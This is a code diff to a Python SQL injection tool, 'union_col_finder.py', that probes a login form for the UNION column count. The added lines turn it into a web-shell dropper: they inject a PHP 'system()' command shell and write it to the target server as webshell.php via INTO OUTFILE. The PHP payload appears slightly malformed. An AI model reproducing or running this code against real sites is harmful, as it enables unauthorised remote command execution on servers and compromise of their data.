@@ -11,9 +11,10 @@ host = sys.argv[1]
 page_target = sys.argv[2]
 uri_val = sys.argv[3]
 failure_str = sys.argv[4]
+outfile_loc = sys.argv[5]
 
-if None == host or "" == host or None == page_target or "" == page_target or None == uri_val or "" == uri_val or None == failure_str or "" == failure_str:
-    print("Usage: python union_col_finder.py <HOST> <LOGIN PAGE> <POST VARIABLE> <FAILURE STRING>")
+if len(sys.argv) != 6:
+    print("Usage: python union_col_finder.py <HOST> <LOGIN PAGE> <POST VARIABLE> <FAILURE STRING> <WRITE LOCATION>")
     sys.exit(0)
 
 print(f"Finding column limit of UNION on {host}/{page_target} at value: {uri_val}")
@@ -34,6 +35,8 @@ while 1:
             continue
 
         print(Fore.GREEN + Style.BRIGHT + f"[+] No failure detected. Stopped at count {c}")
+        final_url = url.replace("null", "\"<?php system($_REQUEST(['cmd'])); ?>\"", count=1).replace("-- //", f"INTO OUTFILE \"{outfile_loc}/webshell.php\" -- //")
+        print(Fore.GREEN + Style.BRIGHT + f"Final URL: {final_url}")
         break
         
 
